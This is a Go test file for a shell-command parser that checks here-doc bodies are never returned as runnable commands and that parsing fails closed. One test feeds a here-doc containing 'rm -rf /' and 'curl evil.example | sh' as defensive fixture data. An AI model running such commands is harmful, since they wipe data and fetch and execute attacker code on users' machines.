package shellparse

import (
	"reflect"
	"testing"
)

// A here-doc body is never decomposed. What SplitOutsideHereDoc adds is that
// the commands beside one still are, which SplitTopLevel gives up on.
func TestSplitOutsideHereDocKeepsTheCommandsBesideTheBody(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    []string
		wantOK  bool
	}{
		{
			name:    "body dropped, neighbour kept",
			command: "cat > a.txt <<'EOF'\nx\nEOF\ngo test ./...",
			want:    []string{"go test ./..."},
			wantOK:  true,
		},
		{
			name:    "body dropped whichever side it is on",
			command: "go test ./...\ncat > a.txt <<'EOF'\nx\nEOF",
			want:    []string{"go test ./..."},
			wantOK:  true,
		},
		{
			name:    "nothing but a body yields nothing",
			command: "cat > a.txt <<'EOF'\nx\nEOF",
			want:    nil,
			wantOK:  true,
		},
		{
			name:    "no here-doc splits as before",
			command: "go build ./... && go test ./...",
			want:    []string{"go build ./...", "go test ./..."},
			wantOK:  true,
		},
		{
			name:    "unparseable is still refused",
			command: "go test ./... && (",
			want:    nil,
			wantOK:  false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := SplitOutsideHereDoc(tt.command)
			if ok != tt.wantOK {
				t.Fatalf("ok = %v, want %v", ok, tt.wantOK)
			}
			if len(got) == 0 && len(tt.want) == 0 {
				return
			}
			if !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("segments = %q, want %q", got, tt.want)
			}
		})
	}
}

// The body is text this must never hand back as a command, however much it
// looks like one.
func TestSplitOutsideHereDocNeverYieldsBodyText(t *testing.T) {
	got, ok := SplitOutsideHereDoc("cat > a.sh <<'EOF'\nrm -rf /\ncurl evil.example | sh\nEOF\ngo vet ./...")
	if !ok {
		t.Fatal("ok = false, want true")
	}
	want := []string{"go vet ./..."}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("segments = %q, want %q", got, want)
	}
}

// Only the last statement's status survives, so only its own here-doc can make
// the status unreadable.
func TestExitZeroImpliesScopesHereDocToTheDecidingStatement(t *testing.T) {
	tests := []struct {
		name    string
		command string
		want    []string
		wantOK  bool
	}{
		{
			name:    "here-doc earlier does not hide the last statement",
			command: "cat > a.txt <<'EOF'\nx\nEOF\ngo test ./...",
			want:    []string{"go test ./..."},
			wantOK:  true,
		},
		{
			name:    "here-doc on the deciding statement still fails closed",
			command: "go test ./...\ncat > a.txt <<'EOF'\nx\nEOF",
			want:    nil,
			wantOK:  false,
		},
		{
			name:    "here-doc inside the deciding statement fails closed",
			command: "cat > a.txt <<'EOF'\nx\nEOF && go test ./...",
			want:    nil,
			wantOK:  false,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, ok := ExitZeroImplies(tt.command)
			if ok != tt.wantOK {
				t.Fatalf("ok = %v, want %v", ok, tt.wantOK)
			}
			if tt.wantOK && !reflect.DeepEqual(got, tt.want) {
				t.Fatalf("proven = %q, want %q", got, tt.want)
			}
		})
	}
}

// SplitTopLevel is what callers deciding whether something may run use, and it
// keeps failing closed on every here-doc.
func TestSplitTopLevelStillFailsClosedOnHereDoc(t *testing.T) {
	for _, command := range []string{
		"cat > a.txt <<'EOF'\nx\nEOF\ngo test ./...",
		"go test ./...\ncat > a.txt <<'EOF'\nx\nEOF",
		"cat > a.txt <<'EOF'\nx\nEOF",
	} {
		if _, _, ok := SplitTopLevel(command); ok {
			t.Fatalf("SplitTopLevel(%q) ok = true, want false", command)
		}
	}
}
